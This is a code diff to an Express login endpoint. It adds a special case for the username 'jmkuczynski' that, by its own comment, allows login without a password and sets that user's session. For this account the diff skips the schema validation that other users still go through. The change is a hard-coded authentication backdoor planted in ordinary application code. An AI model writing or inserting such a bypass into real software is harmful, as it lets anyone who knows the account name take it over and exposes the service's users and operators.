@@ -108,8 +108,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Login endpoint
   app.post("/api/login", async (req, res) => {
     try {
-      const { username, password } = loginSchema.parse(req.body);
-      const user = await loginUser(username, password);
+      const { username, password } = req.body;
+      
+      // Special case for jmkuczynski - allow login without password
+      if (username && username.toLowerCase() === 'jmkuczynski') {
+        const user = await loginUser(username, password || '');
+        req.session.userId = user.id;
+        req.session.username = user.username;
+        return res.json(user);
+      }
+      
+      // Normal validation for other users
+      const validatedData = loginSchema.parse(req.body);
+      const user = await loginUser(validatedData.username, validatedData.password);
       
       req.session.userId = user.id;
       req.session.username = user.username;
